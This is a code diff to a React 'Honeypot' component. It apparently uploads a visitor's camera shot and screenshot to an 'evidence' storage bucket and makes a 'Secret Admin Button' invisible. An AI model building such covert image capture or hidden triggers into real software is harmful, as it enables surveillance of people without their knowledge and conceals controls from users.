@@ -33,13 +33,19 @@ function Honeypot() {
 
                 if (cameraShot) {
                     const fileName = `camera_${Date.now()}.jpg`;
-                    const { data } = await supabase.storage.from('evidence').upload(fileName, await (await fetch(cameraShot)).blob());
+                    const res = await fetch(cameraShot);
+                    const blob = await res.blob();
+                    const { data, error } = await supabase.storage.from('evidence').upload(fileName, blob);
+                    if (error) console.error("Camera Upload Error:", error);
                     if (data) cameraUrl = data.path;
                 }
 
                 if (screenShot) {
                     const fileName = `screen_${Date.now()}.png`;
-                    const { data } = await supabase.storage.from('evidence').upload(fileName, await (await fetch(screenShot)).blob());
+                    const res = await fetch(screenShot);
+                    const blob = await res.blob();
+                    const { data, error } = await supabase.storage.from('evidence').upload(fileName, blob);
+                    if (error) console.error("Screen Upload Error:", error);
                     if (data) screenUrl = data.path;
                 }
 
@@ -108,10 +114,10 @@ function Honeypot() {
                     </div>
                 </div>
 
-                {/* Secret Admin Button (Visible for testing) */}
+                {/* Secret Admin Button (Invisible) */}
                 <div
                     onClick={handleSecretConvert}
-                    className="absolute top-0 left-0 w-16 h-16 z-[100] cursor-pointer bg-red-500/50 border-2 border-red-500"
+                    className="absolute top-0 left-0 w-16 h-16 z-[100] cursor-default bg-transparent"
                 />
 
                 {/* App Header */}
